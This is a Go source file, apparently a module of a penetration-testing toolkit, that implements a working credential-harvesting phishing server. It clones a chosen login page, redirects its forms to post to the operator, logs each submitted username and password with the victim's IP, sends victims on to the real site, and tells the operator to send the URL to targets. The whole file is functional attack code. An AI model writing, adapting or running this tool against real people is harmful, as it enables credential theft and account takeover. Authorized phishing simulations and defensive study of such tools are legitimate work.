package phishing

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/bryanparreira/davoid/internal/engagement"
	"github.com/bryanparreira/davoid/internal/modules/ui"
)

var (
	clonedPage    []byte
	targetBaseURL string
)

func Run() error {
	ui.Header("Phantom Cloner — Credential Harvesting Portal")

	target := ui.Prompt("URL to clone (e.g. https://example.com/login)")
	if target == "" {
		return nil
	}
	if !strings.HasPrefix(target, "http") {
		target = "https://" + target
	}

	port := ui.PromptDefault("Listen port", "8080")

	fmt.Println()
	ui.Info(fmt.Sprintf("Cloning %s...", target))

	parsed, err := url.Parse(target)
	if err != nil {
		ui.Fail("Invalid URL.")
		return nil
	}
	targetBaseURL = parsed.Scheme + "://" + parsed.Host

	// Fetch + patch the page
	cloned, err := clonePage(target)
	if err != nil {
		ui.Fail(fmt.Sprintf("Clone failed: %v", err))
		return nil
	}
	clonedPage = cloned

	eng, _ := engagement.Active()

	// Save to disk
	outFile := fmt.Sprintf("phishing_%d.html", time.Now().Unix())
	os.WriteFile(outFile, clonedPage, 0600)
	ui.Success(fmt.Sprintf("Page cloned → %s", outFile))

	// Set up HTTP server
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodPost {
			r.ParseForm()
			creds := []string{}
			for k, v := range r.Form {
				creds = append(creds, fmt.Sprintf("%s=%s", k, strings.Join(v, ",")))
			}
			entry := strings.Join(creds, " | ")
			fmt.Printf("\n  %s  %s  →  %s\n",
				ui.Red.Render("CRED"),
				ui.Yellow.Render(r.RemoteAddr),
				ui.Bold.Render(entry),
			)
			if eng != nil {
				engagement.LogFinding(eng.ID, "phishing", r.RemoteAddr,
					"Credential harvested via phishing page",
					entry, "CRITICAL", entry)
			}
			// Redirect victim to real site
			http.Redirect(w, r, target, http.StatusFound)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write(clonedPage)
	})

	srv := &http.Server{
		Addr:    ":" + port,
		Handler: mux,
	}

	localIP := getLocalIP()
	fmt.Println()
	ui.Success(fmt.Sprintf("Phishing server started on http://%s:%s", localIP, port))
	ui.Info("Send this URL to targets. Captured credentials appear below.")
	ui.Warn("Press Ctrl+C to stop.")
	ui.Divider()
	fmt.Printf("  %-16s  %-30s  %s\n",
		ui.Bold.Render("SOURCE IP"),
		ui.Bold.Render("CREDENTIALS"),
		ui.Bold.Render("TIME"),
	)
	ui.Divider()

	return srv.ListenAndServe()
}

func clonePage(target string) ([]byte, error) {
	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Get(target)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	html := string(body)

	// Rewrite form actions to POST to our server
	html = rewriteForms(html)

	// Rewrite relative asset URLs to point to original domain
	html = rewriteAssets(html, targetBaseURL)

	return []byte(html), nil
}

func rewriteForms(html string) string {
	result := html
	start := 0
	for {
		idx := strings.Index(strings.ToLower(result[start:]), "<form")
		if idx < 0 {
			break
		}
		abs := start + idx
		// Find end of form tag
		end := strings.Index(result[abs:], ">")
		if end < 0 {
			break
		}
		formTag := result[abs : abs+end+1]
		lowerTag := strings.ToLower(formTag)

		newTag := formTag
		if strings.Contains(lowerTag, "action=") {
			// Replace existing action
			re := caseInsensitiveReplace(newTag, `action="[^"]*"`, `action="/"`)
			re = caseInsensitiveReplace(re, `action='[^']*'`, `action="/"`)
			newTag = re
		} else {
			// Insert action
			newTag = strings.Replace(newTag, ">", ` action="/" method="POST">`, 1)
		}

		if !strings.Contains(lowerTag, "method=") {
			newTag = strings.Replace(newTag, ">", ` method="POST">`, 1)
		}

		result = result[:abs] + newTag + result[abs+end+1:]
		start = abs + len(newTag)
	}
	return result
}

func rewriteAssets(html, base string) string {
	// Rewrite src="/... and href="/... to absolute URLs
	html = strings.ReplaceAll(html, `src="/`, `src="`+base+"/")
	html = strings.ReplaceAll(html, `href="/`, `href="`+base+"/")
	html = strings.ReplaceAll(html, `url('/`, `url('`+base+"/")
	return html
}

func caseInsensitiveReplace(s, pattern, replace string) string {
	// Simple: just lowercase compare for action= patterns
	lower := strings.ToLower(s)
	idx := strings.Index(lower, strings.ToLower(strings.Split(pattern, "=")[0]+"="))
	if idx < 0 {
		return s
	}
	// Find end quote
	quoteChar := '"'
	startQ := idx + len(strings.Split(pattern, "=")[0]) + 1
	if startQ < len(s) && s[startQ] == '\'' {
		quoteChar = '\''
	}
	if startQ < len(s) {
		startQ++ // skip the quote
	}
	endQ := strings.IndexRune(s[startQ:], quoteChar)
	if endQ < 0 {
		return s
	}
	return s[:idx] + `action="/"` + s[startQ+endQ+1:]
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "localhost"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}
